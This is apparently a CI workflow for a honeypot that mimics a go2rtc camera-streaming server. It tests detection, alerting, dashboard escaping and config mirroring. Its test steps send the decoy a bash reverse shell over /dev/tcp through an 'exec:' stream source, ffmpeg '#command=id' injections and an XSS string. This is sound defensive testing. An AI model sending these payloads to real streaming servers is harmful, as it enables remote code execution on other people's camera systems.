name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

jobs:
  smoke:
    name: Fidelity + trap smoke test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Byte-compile
        run: python3 -m py_compile honeypot.py report.py

      - name: Compose file validation
        run: |
          docker compose -p haotian-miguan -f docker-compose.yml         config -q
          docker compose -p haotian-miguan -f docker-compose.proxy.yml   config -q
          docker compose -p haotian-miguan -f docker-compose.hybrid.yml  config -q
          docker compose -p haotian-miguan -f docker-compose.build.yml   config -q

      - name: Run the pot and verify the illusion
        run: |
          python3 honeypot.py --port 19841 --rtsp-port 18554 --data-dir /tmp/smoke-data --quiet --no-color &
          POT=$!
          # give the pot a moment to bind :19841 / :18554
          for i in $(seq 1 20); do
            curl -sf http://127.0.0.1:19841/api > /dev/null && break
            sleep 0.5
          done
          ./smoke_test.sh 127.0.0.1 19841 18554
          RC=$?
          kill $POT 2>/dev/null || true
          exit $RC

      - name: Trust-proxy evidence check (behind-nginx mode)
        run: |
          python3 honeypot.py --port 19842 --rtsp-port 0 --data-dir /tmp/smoke-tp --quiet --no-color --trust-proxy &
          POT=$!
          for i in $(seq 1 20); do
            curl -sf http://127.0.0.1:19842/api > /dev/null && break
            sleep 0.5
          done
          # attacker reaches the pot through "their nginx": X-Real-IP set,
          # plus a client-spoofed XFF chain whose rightmost hop is real
          curl -s -o /dev/null \
            -H 'X-Real-IP: 203.0.113.66' \
            -H 'X-Forwarded-For: 6.6.6.6, 203.0.113.66' \
            http://127.0.0.1:19842/api/config
          GOT=$(python3 -c "import json;a=json.loads(open('/tmp/smoke-tp/alerts.jsonl').readlines()[-1]);print(a['ip'],a['peer'])")
          echo "evidence ip/peer -> $GOT"
          test "$GOT" = "203.0.113.66 127.0.0.1"
          # invalid X-Real-IP must fall back to the direct peer
          curl -s -o /dev/null -H 'X-Real-IP: definitely-not-an-ip' http://127.0.0.1:19842/api/config
          GOT2=$(python3 -c "import json;a=json.loads(open('/tmp/smoke-tp/alerts.jsonl').readlines()[-1]);print(a['ip'])")
          test "$GOT2" = "127.0.0.1"
          kill $POT 2>/dev/null || true

      - name: Dashboard (payloads displayed, XSS-escaped)
        run: |
          python3 honeypot.py --port 19848 --rtsp-port 0 --data-dir /tmp/dash --quiet --no-color &
          POT=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19848/api >/dev/null && break; sleep 0.5; done
          curl -s -o /dev/null -X POST --data-binary \
            $'streams:\n  dash_pwn: ffmpeg:rtsp://x#command=id\n  xss: rtsp://x/<script>alert(1)</script>\n' \
            http://127.0.0.1:19848/api/config
          python3 dashboard.py --data-dir /tmp/dash --port 19851 &
          DASH=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19851/ >/dev/null && break; sleep 0.5; done
          curl -s http://127.0.0.1:19851/ > /tmp/dash.html
          grep -q "Configs attackers tried to apply" /tmp/dash.html
          grep -q "command=id" /tmp/dash.html          # the applied payload is shown
          grep -q "&lt;script&gt;" /tmp/dash.html       # hostile markup escaped
          ! grep -q "<script>alert" /tmp/dash.html
          curl -s http://127.0.0.1:19851/data.json | grep -q dash_pwn
          kill $POT $DASH 2>/dev/null || true

      - name: Config mirroring (fake config = the real one, secrets scrubbed)
        run: |
          printf 'api:\n  listen: ":1984"\n  username: admin\n  password: CI_REAL_SECRET\nstreams:\n  cam1: rtsp://admin:CI_CAM_SECRET@10.0.0.1/x\n' > /tmp/real.yaml
          python3 honeypot.py --port 19863 --rtsp-port 0 --config-file /tmp/real.yaml \
            --data-dir /tmp/mir-a --quiet --no-color &
          REAL=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19863/api >/dev/null && break; sleep 0.5; done
          python3 honeypot.py --port 19864 --rtsp-port 0 --upstream http://127.0.0.1:19863 \
            --data-dir /tmp/mir-b --quiet --no-color &
          POT=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19864/api >/dev/null && break; sleep 0.5; done
          sleep 1
          CFG=$(curl -s http://127.0.0.1:19864/api/config)
          echo "$CFG"
          echo "$CFG" | grep -q "password: Restream2026"     # secret key scrubbed
          echo "$CFG" | grep -q "username: admin"            # structure kept
          echo "$CFG" | grep -q cam1
          ! echo "$CFG" | grep -q CI_REAL_SECRET
          ! echo "$CFG" | grep -q CI_CAM_SECRET
          kill $POT $REAL 2>/dev/null || true

      - name: UI-clean listing (operator's browser sees the real list)
        run: |
          python3 honeypot.py --port 19865 --rtsp-port 0 --data-dir /tmp/ui-a --quiet --no-color &
          REAL=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19865/api >/dev/null && break; sleep 0.5; done
          python3 honeypot.py --port 19866 --rtsp-port 0 --upstream http://127.0.0.1:19865 \
            --data-dir /tmp/ui-b --quiet --no-color --hide-planted-from-ui &
          POT=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19866/api >/dev/null && break; sleep 0.5; done
          sleep 1
          curl -s -o /dev/null -X POST --data-binary \
            $'streams:\n  ui_pwn: ffmpeg:rtsp://x#command=id\n' http://127.0.0.1:19866/api/config
          curl -s -o /dev/null -X POST http://127.0.0.1:19866/api/restart
          curl -s http://127.0.0.1:19866/api/streams | grep -q ui_pwn          # scripted: visible
          ! curl -s -H 'Sec-Fetch-Site: same-origin' http://127.0.0.1:19866/api/streams | grep -q ui_pwn
          kill $POT $REAL 2>/dev/null || true

      - name: "exec: source detection (the 1.9.x RCE primitive)"
        run: |
          python3 honeypot.py --port 19869 --rtsp-port 0 --data-dir /tmp/exec-a --quiet --no-color &
          POT=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19869/api >/dev/null && break; sleep 0.5; done
          # exec: runs its argument in a shell
          curl -s -o /dev/null -X POST --data-binary \
            $'streams:\n  ex: exec: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n' \
            http://127.0.0.1:19869/api/config
          GOT=$(python3 -c "import json;a=json.loads(open('/tmp/exec-a/alerts.jsonl').readlines()[-1]);print(a['tags'],a['severity'])")
          echo "exec alert -> $GOT"
          echo "$GOT" | grep -q exec_source
          echo "$GOT" | grep -q high
          # even the innocent-looking form is a command channel
          curl -s -o /dev/null -X POST --data-binary \
            $'streams:\n  ex2: exec: echo hello {output}\n' http://127.0.0.1:19869/api/config
          python3 -c "import json;a=json.loads(open('/tmp/exec-a/alerts.jsonl').readlines()[-1]);assert 'exec_source' in a['tags'],a['tags']"
          # PUT accepts an exec source like a real 1.9.x does
          curl -s -o /dev/null -w '%{http_code}' -X PUT \
            "http://127.0.0.1:19869/api/streams?src=exec:bash&name=ex3" | grep -q 200
          kill $POT 2>/dev/null || true

      - name: Config sync (real config changes propagate, no phantom rows)
        run: |
          printf 'streams:\n  keepme: rtsp://admin:x@10.0.0.1/x\n  ghost: rtsp://admin:y@10.0.0.2/x\n' > /tmp/sync.yaml
          python3 honeypot.py --port 19867 --rtsp-port 0 --config-file /tmp/sync.yaml \
            --data-dir /tmp/sync-a --quiet --no-color &
          REAL=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19867/api >/dev/null && break; sleep 0.5; done
          python3 honeypot.py --port 19868 --rtsp-port 0 --upstream http://127.0.0.1:19867 \
            --data-dir /tmp/sync-b --quiet --no-color --config-sync 2 &
          POT=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19868/api >/dev/null && break; sleep 0.5; done
          sleep 1
          curl -s http://127.0.0.1:19868/api/streams | grep -q ghost
          # operator removes the stream on the real instance
          printf 'streams:\n  keepme: rtsp://admin:x@10.0.0.1/x\n' > /tmp/sync2.yaml
          curl -s -o /dev/null -X POST --data-binary @/tmp/sync2.yaml http://127.0.0.1:19867/api/config
          curl -s -o /dev/null -X POST http://127.0.0.1:19867/api/restart
          # the pot's listing follows the live truth at once (no phantom rows)
          ! curl -s http://127.0.0.1:19868/api/streams | grep -q ghost
          # and the fake config text catches up within one sync window
          sleep 2.5
          curl -s http://127.0.0.1:19868/api/config | grep -q keepme
          ! curl -s http://127.0.0.1:19868/api/config | grep -q ghost
          kill $POT $REAL 2>/dev/null || true

      - name: Hybrid mode (real instance + honeypot seam)
        run: |
          # A stands in for the user's real go2rtc; B is the hybrid pot
          python3 honeypot.py --port 19843 --rtsp-port 0 --version-string 1.8.4 \
            --data-dir /tmp/hyb-a --quiet --no-color &
          REAL=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19843/api >/dev/null && break; sleep 0.5; done
          python3 honeypot.py --port 19844 --rtsp-port 0 \
            --upstream http://127.0.0.1:19843 \
            --data-dir /tmp/hyb-b --quiet --no-color &
          POT=$!
          for i in $(seq 1 20); do curl -sf http://127.0.0.1:19844/api >/dev/null && break; sleep 0.5; done
          sleep 1
          set -e
          # auto-seed: the fake config carries the real stream names,
          # credentials sanitized — never the real passwords
          curl -s http://127.0.0.1:19844/api/config | grep -q "Restream2026"
          ! curl -s http://127.0.0.1:19844/api/config | grep -q "DoorCam2024"
          # /api adopts the real version; host stays the client's
          curl -s http://127.0.0.1:19844/api | grep -q '"version": "1.8.4"'
          # merged listing shows the real streams
          curl -s http://127.0.0.1:19844/api/streams | grep -q front_door
          # attacker applies a config + "restarts" — their stream appears
          curl -s -o /dev/null -X POST --data-binary \
            $'streams:\n  ci_pwn: ffmpeg:rtsp://1.2.3.4/x#video=copy#command=id\n' \
            http://127.0.0.1:19844/api/config
          curl -s -o /dev/null -X POST http://127.0.0.1:19844/api/restart
          curl -s http://127.0.0.1:19844/api/streams | grep -q ci_pwn
          # fake log adopts the real version
          curl -s http://127.0.0.1:19844/api/log | grep -q "go2rtc version 1.8.4"
          # viewing the planted stream = the RCE trigger (high alert)
          curl -s -o /dev/null http://127.0.0.1:19844/api/frame.jpeg?src=ci_pwn
          GOT=$(python3 -c "import json;a=json.loads(open('/tmp/hyb-b/alerts.jsonl').readlines()[-1]);print(a['tags'],a['severity'])")
          echo "planted-view alert -> $GOT"
          echo "$GOT" | grep -q planted_view
          echo "$GOT" | grep -q high
          # deleting a REAL stream hides it locally, never touches upstream
          curl -s -o /dev/null -X DELETE http://127.0.0.1:19844/api/streams?src=front_door
          ! curl -s http://127.0.0.1:19844/api/streams | grep -q '"front_door"'
          curl -s http://127.0.0.1:19843/api/streams | grep -q '"front_door"'
          # pages are relayed to the real instance, never the pot's own UI
          diff <(curl -s http://127.0.0.1:19843/add.html) \
               <(curl -s http://127.0.0.1:19844/add.html) >/dev/null
          diff <(curl -s http://127.0.0.1:19843/main.js) \
               <(curl -s http://127.0.0.1:19844/main.js) >/dev/null
          set +e
          kill $POT $REAL 2>/dev/null || true
